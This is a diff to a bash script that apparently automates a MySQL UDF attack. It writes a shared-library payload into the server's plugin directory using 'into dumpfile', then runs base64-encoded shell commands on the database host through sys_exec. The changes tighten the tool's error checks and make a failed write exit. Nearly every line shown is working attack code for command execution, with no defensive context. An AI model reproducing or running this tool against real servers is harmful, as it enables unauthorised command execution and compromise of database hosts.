@@ -140,14 +140,16 @@ CONN="mysql -h${HOST} -u${USER} -P${PORT} -p${PASS} "
 # dump udf so file {{{1
 if [ "${MODE}" = "${MODE_DUMP}" ] ;then
     # already dump and import? {{{1
-    if ${CONN} -e "select sys_exec('echo a') \G" | grep -vq "FUNCTION sys_exec does not exist" ;then
+    if ${CONN} -e "select sys_exec('echo a') \G" 2>&1 | grep -qP "FUNCTION sys_exec does not exist|(ERROR 1046 \(3D000\))" ;then
+        sleep 0.1
+    else
         printf "${YELLOW}WARN${NONE}: ${GREEN}sys_exec${NONE} function is already imported, please use ${YELLOW}--mode=${MODE_EXEC} --cmd=%s${NONE} execute cmd.\n" "\$(echo 'cmd' | base64 -w 0)"
         exit 0
     fi
     #}}}
 
     # get plugin_dir {{{1
-    plugin_dir=$(${CONN} -e "select @@plugin_dir \G" | grep -oP "(?<=@plugin_dir: )\S*")
+    plugin_dir=$(${CONN} -e "select @@plugin_dir \G" 2>&1 | grep -oP "(?<=@plugin_dir: )\S*")
 
     if [ -z "${plugin_dir}" ]; then
         printf "${RED}%s${NONE}: could not locate plugin directory." "ERR"
@@ -161,11 +163,11 @@ if [ "${MODE}" = "${MODE_DUMP}" ] ;then
     udf_filename="udf_$(date +%s%N).so"
     udf_outfile="${plugin_dir}${udf_filename}"
 
-    ${CONN} -e "select binary 0x${shellcode} into dumpfile '${udf_outfile}' \G"
+    ${CONN} -e "select binary 0x${shellcode} into dumpfile '${udf_outfile}' \G" 2>/dev/null
 
     if [ ! -s "${udf_outfile}" ]; then
         printf "${RED}%s${NONE}: write udf so file failure :${YELLOW} ${udf_outfile}${NONE} \n" "ERR"
-    #    exit 1
+        exit 1
     fi
     printf "${GREEN}%s${NONE}: write udf so file success :${YELLOW} ${udf_outfile}${NONE} \n" "OK"
     #}}}
@@ -176,7 +178,7 @@ if [ "${MODE}" = "${MODE_DUMP}" ] ;then
 
 # check udf (sys_exec) is ready? {{{1
 elif [ "${MODE}" = "${MODE_CHECK}" ]; then
-    if ${CONN} -e "select sys_exec('echo a') \G" | grep -q "FUNCTION sys_exec does not exist" ;then
+    if ${CONN} -e "select sys_exec('echo a') \G" 2>&1 | grep -qP "(FUNCTION sys_exec does not exist)|(ERROR 1046 \(3D000\))" ;then
         printf "${RED}%s${NONE}: ${YELLOW}sys_exec${NONE} function is not execuable, please use ${YELLOW}--mode=${MODE_DUMP}${NONE} dump udf.so first.\n" "ERR"
         exit 1
     else
@@ -191,8 +193,7 @@ elif [ "${MODE}" = "${MODE_EXEC}" ]; then
         exit 1
     fi
     # execute cmd
-    exec_res=$(${CONN} -e "select sys_exec('echo -n ${CMD} | base64 -d | bash')" 2>&1)
-    if echo "${exec_res}" | grep -q "FUNCTION sys_exec does not exist" ; then
+    if ${CONN} -e "select sys_exec('echo -n ${CMD} | base64 -d | bash')" 2>&1 | grep -qP "(FUNCTION sys_exec does not exist)|(ERROR 1046 \(3D000\))" ; then
         printf "${RED}%s${NONE}: ${YELLOW}sys_exec${NONE} function is not execuable, please use ${YELLOW}--mode=${MODE_DUMP}${NONE} dump udf.so first.\n" "ERR"
         exit 1
     fi
